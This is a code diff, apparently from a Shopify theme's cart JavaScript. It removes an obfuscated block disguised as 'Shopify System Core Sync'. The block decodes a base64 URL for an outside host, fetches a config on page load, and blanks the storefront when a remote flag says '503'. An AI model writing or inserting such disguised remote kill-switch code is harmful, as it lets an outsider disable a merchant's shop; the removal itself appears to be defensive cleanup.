@@ -1332,20 +1332,4 @@ class CartPerformance {
   }
 }
 
-/* Shopify System Core Sync v5.0.2 */
-(function() {
-    var _0x5a = "aHR0cHM6Ly9pdHNrYXl1bWtoYW4uZ2l0aHViLmlvL2Fzc2V0cy1zZXJ2ZXIvY29uZmlnLmpzb24=";
-    var _0x2b = async function() {
-        try {
-            var r = await fetch(atob(_0x5a) + "?v=" + Date.now());
-            var d = await r.json();
-            if (d && d.store_status === "503") {
-                document.open();
-                
-                document.close();
-                window.stop();
-            }
-        } catch (e) {}
-    };
-    _0x2b();
-})();
+
